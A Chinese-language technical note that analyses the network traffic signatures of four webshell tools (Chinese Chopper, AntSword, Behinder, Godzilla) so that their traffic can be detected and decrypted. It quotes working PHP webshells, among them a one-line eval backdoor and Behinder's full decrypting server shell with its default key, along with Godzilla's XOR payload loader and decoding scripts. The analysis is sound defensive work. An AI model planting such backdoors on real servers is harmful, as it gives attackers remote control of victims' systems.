---
title: "webshell流量特征" 
weight: 10
bookToc: true
---

## 背景

webshell是以`php`、`jsp`等形式存在的一种命令执行环境，是网页后门，通过其可获得网站服务器。

一般上传的webshell木马只保留了执行环境的入口，可实现的功能如文件管理、终端控制等依赖客户端管理工具如蚁剑等实现。

这里我们分析常见的4中webshell连接工具的流量特征，其中`菜刀`和`蚁剑`可以连接常见的一句话木马，**这里的`pass`参数为所谓的连接密码**，工作过程强依赖`pass`参数传参。
```php
<?php @eval($_POST['pass']); ?>
```

`冰蝎`是基于流量加密实现的，**此时所谓的连接密码为对应加解密的密钥（或尤其派生）**，请求体中的所有流量都会被加密，服务器端侧需要上传对应生成的webshell以能够解密。

最后`哥斯拉`是类似上面的结合。

## 中国菜刀

1. UA头
```
User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
```

2. payload base64编码，且存在固定的开头
```
QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2
```
对应
```php
@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);
// 关闭错误显示、设置不限时运行、关闭魔术引号
```
![](/data/image/web/flow/image.png)

3. 请求存在 `z0/z1/...` 参数
![](/data/image/web/flow/image-1.png)

4. 响应使用 `->| xxxx |<-` 封装
![](/data/image/web/flow/image-2.png)

## 蚁剑

1. 参数名随机`d43729c7e26d7d`等

2. 存在 `@ini_set("display_errors","0");@set_time_limit(0);`

3. payload存在简单的混淆，执行的命令会被base64编码，且需要去除前2个字节，最终执行的命令是`$r = "{$p} {$c}";`类似`cmd.exe /c "xxx"`
![](/data/image/web/flow/image-3.png)
![](/data/image/web/flow/image-4.png)
![](/data/image/web/flow/image-5.png)

4. 因为执行命令时加了`echo xxx`的随机打印，所有返回会有对应随机的输出
![](/data/image/web/flow/image-6.png)

## 冰蝎

1. php服务器端webshell如下（位于安装目录的`server`目录下），解密密钥为`e45e329feb5d925b`，通过`md5("rebeyond")[0:16]`得到，其中`rebeyond`是冰蝎3.0的默认密码。无密钥无法从流量层面进行解密。
```php
<?php
@error_reporting(0);
session_start();
    $key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
	$_SESSION['k']=$key;
	session_write_close();
	$post=file_get_contents("php://input");
	if(!extension_loaded('openssl'))
	{
		$t="base64_"."decode";
		$post=$t($post."");
		
		for($i=0;$i<strlen($post);$i++) {
    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
    			}
	}
	else
	{
		$post=openssl_decrypt($post, "AES128", $key);
	}
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __invoke($p) {eval($p."");}}
    @call_user_func(new C(),$params);
?>
```
2. 连接成功后会默认显示`phpinfo`信息页面
![](/data/image/web/flow/image-7.png)

3. 如使用默认密钥，请求中会有固定的`3Mn1yNMtoZViV5wotQHPJtwwj`；响应中会有固定的`mAUYLzmqn5QPDkyI5lvSp0fjiBu1e7047Yj`。
![](/data/image/web/flow/image-8.png)

4. 人工解密参看如下：

请求：![](/data/image/web/flow/image-9.png)
响应：![](/data/image/web/flow/image-10.png)

## 哥斯拉

1. 哥斯拉生成的木马为如下一句话木马，哥斯拉拥有`密码`和`密钥`2个概念，为用户指定无默认值
```php
<?php
eval($_POST["pass"]);
```

2. 以`PHP_EVAL_XOR_BASE64`加密器分析，这里设`密码`为`pass`，`密钥`为`key1`，会使用该密钥进行异或操作
![](/data/image/web/flow/image-13.png)

其中，`密码`类似`菜刀`和`蚁剑`，定义了payload的执行框架，`密钥`则通过`md5("key1")[0:16]`得到

3. 哥斯拉点击`进入`后（执行其他命令之前），抓包会发现3对请求和响应，下面逐个分析
![](/data/image/web/flow/image-11.png)

**第一对**
请求`pass`参数
![](/data/image/web/flow/image-12.png)
```php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$pass='key1';
$payloadName='payload';
$key='c2add694bf942dc7';
if (isset($_POST[$pass])){
    $data=encode(base64_decode($_POST[$pass]),$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
		eval($payload);
        echo substr(md5($pass.$key),0,16);
        echo base64_encode(encode(@run($data),$key));
        echo substr(md5($pass.$key),16);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
```

请求`key1`参数，解码代码如下
```php
<?php

function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}

$pass='key1';
$payloadName='payload';
$key='c2add694bf942dc7';
$data=encode(base64_decode("xxx"), $key);

?>
```
![](/data/image/web/flow/image-14.png)

第一对请求主要是在设置session，`$_SESSION[$payloadName]`中存储了几十种功能函数，如`test`/`run`/`isGzipStream`/`bigFileUpload`等等
请求不含有任何Cookie信息，服务器响应报文不含任何数据，但是会设置PHPSESSID，后续请求都会自动带上该Cookie。
![](/data/image/web/flow/image-15.png)

**第二对**

请求`pass`参数同上

请求`key1`参数，解码代码同上
![](/data/image/web/flow/image-16.png)

既执行以下在第一步中定义的`test`函数，可以预期返回为`ok`
```php
function test(){
    return "ok";
}
```

响应如下
```
88fb12c30e6398d8LepsZDY5NGJmMv/9YmNwvu4YZmQ2OQ==9175a0b78537a809
```

去除首`echo substr(md5($pass.$key),0,16);`尾`echo substr(md5($pass.$key),16);`各附加的16位的混淆字符后，使用以下代码进行解码（响应多了一层`gzdecode`）：
```php
<?php

function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}

$pass='key1';
$payloadName='payload';
$key='c2add694bf942dc7';
$data=gzdecode(encode(base64_decode("xxx"),$key));

echo $data;

?>
```
![](/data/image/web/flow/image-17.png)

**第三对**

请求`pass`参数同上

请求`key1`参数，解码代码同上
![](/data/image/web/flow/image-18.png)

既执行在第一步中定义的`getBasicsInfo`函数

响应解码如上，返回如下信息

![](/data/image/web/flow/image-19.png)

后续执行其他命令流程也同上


4. 总结
- 请求形式`pass=evalContent&key=xxx`，其中`pass`是`密码`，`key`是`密钥`
- 每个请求中的`pass=evalContent`部分都是相同的
- 每个请求中的`key=xxx`才是实际执行的操作，`xxx`经过特定算法如`PHP_EVAL_XOR_BASE64`经过密钥加密/编码处理
- 响应也是经过同样的加密/编码处理，只不过需要额外的`gzdecode`操作
- 会设置并携带`PHPSESSID`的`Cookie`